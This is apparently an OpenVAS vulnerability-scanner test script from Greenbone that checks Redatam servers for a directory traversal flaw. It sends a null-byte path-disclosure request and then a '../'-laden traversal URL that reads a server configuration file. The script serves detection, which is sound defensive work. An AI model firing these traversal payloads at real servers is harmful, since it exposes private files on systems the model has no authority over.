##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_redatam_dir_trav_vuln.nasl 12120 2018-10-26 11:13:20Z mmartin $
#
# Redatam Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:redatam:redatam";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141197");
  script_version("$Revision: 12120 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 13:13:20 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-06-19 13:19:44 +0700 (Tue, 19 Jun 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Redatam Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_redatam_detect.nasl");
  script_mandatory_keys("redatam/installed");

  script_tag(name:"summary", value:"Redatam is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Update to version 7 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44905/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

# path disclosure
req = http_get(port: port, item: "/redbin/rpwebutilities.exe/text?LFN=dfasff%00.htm&TYPE=TMP");
res = http_keepalive_send_recv(port: port, data: req);

path = eregmatch(pattern: "File not found in folder \[[^\]+([^]]+)", string: res);
if (isnull(path[1]))
  exit(0);

path = str_replace(string: path[1], find: '\\', replace: "/");

url = "/redbin/rpwebutilities.exe/text?LFN=../../../../../../../../../../../../../../../.." + path +
      "prt/webservermain.inl%00.htm&TYPE=TMP";

if (http_vuln_check(port: port, url: url, pattern: "PORTALTITLE=", check_header: TRUE, debug: FALSE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
